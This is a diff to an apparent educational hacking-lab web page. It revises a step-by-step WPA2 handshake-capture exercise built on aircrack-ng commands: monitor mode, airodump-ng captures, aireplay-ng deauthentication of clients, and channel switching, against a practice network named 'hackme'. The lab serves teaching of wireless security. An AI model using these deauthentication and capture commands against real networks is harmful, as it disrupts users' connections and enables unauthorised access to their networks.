@@ -924,6 +924,11 @@ Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds</div>
         <h4>📡 Setting Up Monitor Mode</h4>
         <p><strong>Monitor mode explained:</strong> Normal WiFi cards only see traffic meant for them. 
         Monitor mode lets you see ALL WiFi traffic in the area - like turning your WiFi card into a "WiFi wiretap".</p>
+        <details>As you're directly tinkering with interfaces, you'll need administrator rights. Admin on unix is known as
+          <code>root</code>. You can run <div class="command-line">sudo $command</div> to start elevated processes<br>
+          You can also permanently switch by issuing
+          <div class="command-line">sudo su</div>
+          Remember: be careful, with great power becomes great responsibility</details>
         <br>
         <div class="step-by-step">
           <div class="step">
@@ -934,12 +939,18 @@ Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds</div>
           <div class="step">
             <strong>Enable monitor mode</strong>
             <div class="command-line">airmon-ng start wlan1</div>
-            <p>This puts your WiFi adapter into monitor mode (interface becomes wlan1mon)</p>
+            <p>This puts your WiFi adapter into monitor mode</p>
+            <details>you might need to kill processes interfering with your wireless interface.<br>
+              <div class="command-line">airmon-ng check kill</div> stops these processes, but this will disable your built-in WiFi as well.</details>
           </div>
           <div class="step">
             <strong>Scan for WiFi networks</strong>
-            <div class="command-line">airodump-ng wlan1mon</div>
-            <p>This shows all WiFi networks in range with details like encryption type and signal strength</p>
+            <div class="command-line">airodump-ng wlan1 -w network-capture</div>
+            <p>This shows all WiFi networks in range with details like encryption type and signal strength. The output files
+              starting with <code>network-capture</code> contain the capture information. Look through the <code>csv</code> to find
+              the access point MAC (station) address, and see what devices are connected to this MAC address. We need the MACs
+              for our attack!
+              </p>
           </div>
         </div>
         <br>
@@ -957,17 +968,18 @@ Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds</div>
         <div class="step-by-step">
           <div class="step">
             <strong>Target specific network</strong>
-            <div class="command-line">airodump-ng -c [CHANNEL] --bssid [ROUTER_MAC] -w capture wlan1mon</div>
-            <p>Focus on one network and save captured data to files</p>
+            <div class="command-line">airodump-ng -c [CHANNEL] --bssid [AP_MAC] -w capture wlan1mon</div>
+            <p>This will focus on one access point and client, listening for their handshakes and saving them.</p>
           </div>
           <div class="step">
-            <strong>Force a handshake (deauth attack)</strong>
-            <div class="command-line">aireplay-ng -0 5 -a [ROUTER_MAC] -c [CLIENT_MAC] wlan1mon</div>
-            <p>Disconnect a client to force re-authentication (and capture the handshake)</p>
+            <strong>Force a handshake (deauth attack)</strong><br>
+            <strong>MAKE SURE YOUR PREVIOUS CAPTURE COMMAND STAYS RUNNING! Do this in a new terminal</strong>
+            <div class="command-line">aireplay-ng -0 5 -a [AP_MAC] -c [CLIENT_MAC] wlan1</div>
+            <p>This will disconnect the client, forcing re-authentication (and capture the handshake)</p>
           </div>
           <div class="step">
             <strong>Verify handshake capture</strong>
-            <p>Look for "WPA handshake" message in airodump-ng output</p>
+            <p>Look for "WPA handshake" message in airodump-ng output OR "Created capture file..."</p>
           </div>
         </div>
         <br>
@@ -987,7 +999,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds</div>
 phy0    wlan1           ath9k_htc       Atheros Communications, Inc.</div>
           </div>
           <div class="step">
-            <strong>Enable monitor mode</strong>
+            <strong>Enable monitor mode</strong> (this should be the realtek adapter)
             <div class="command-line">airmon-ng start wlan1</div>
             <div class="terminal-output">PHY     Interface       Driver          Chipset
 phy0    wlan1mon        ath9k_htc       Atheros Communications, Inc.
@@ -995,7 +1007,7 @@ phy0    wlan1mon        ath9k_htc       Atheros Communications, Inc.
           </div>
           <div class="step">
             <strong>Scan for target networks</strong>
-            <div class="command-line">airodump-ng wlan1mon</div>
+            <div class="command-line">airodump-ng wlan1 -w network-capture</div>
             <div class="terminal-output">BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
 AA:BB:CC:DD:EE:FF  -30       47        0    0  11  54e  WPA2 CCMP   PSK  hackme
 11:22:33:44:55:66  -45       32        5    1   6  54e  WPA2 CCMP   PSK  OfficeWiFi</div>
@@ -1003,13 +1015,13 @@ AA:BB:CC:DD:EE:FF  -30       47        0    0  11  54e  WPA2 CCMP   PSK  hackme
           </div>
           <div class="step">
             <strong>Focus on target and capture handshake</strong>
-            <div class="command-line">airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w hackme_capture wlan1mon</div>
+            <div class="command-line">airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w hackme_capture wlan1</div>
             <p>This monitors only the "hackme" network on channel 11</p>
           </div>
           <div class="step">
             <strong>Force handshake (in new terminal)</strong>
-            <div class="command-line">aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF wlan1mon</div>
-            <div class="terminal-output">Sending 3 directed DeAuth to broadcast
+            <div class="command-line">aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan1</div>
+            <div class="terminal-output">Sending 5 directed DeAuth to broadcast
 C0:FF:EE:C0:FF:EE - Channel 11 - 'hackme'</div>
             <p>This disconnects all clients, forcing them to reconnect</p>
           </div>
@@ -1038,6 +1050,12 @@ Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</div>
             <p>Return your WiFi adapter to normal mode</p>
           </div>
         </div>
+        <div class="important-note">
+          <strong>⚡ Pro tip:</strong> sometimes, you'll be on the wrong channel.
+          <code> wlan1 is on channel xx, but the AP uses channel yy</code>.
+          To switch to the right channel, use
+          <div class="command-line">iwconfig wlan1 channel yy</div>
+        </div>
         <div class="security-tip">
           <strong>🛡️ What this demonstrates:</strong>
           <ul>
@@ -1048,7 +1066,7 @@ Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</div>
           </ul>
         </div>
         <button class="hint-button" onclick="completeChallenge(4, 25)" data-key="challenge4.complete">✅ WiFi Hacked!</button>
-      </div>
+        </div>
     </div>
 
     <!-- Completion -->
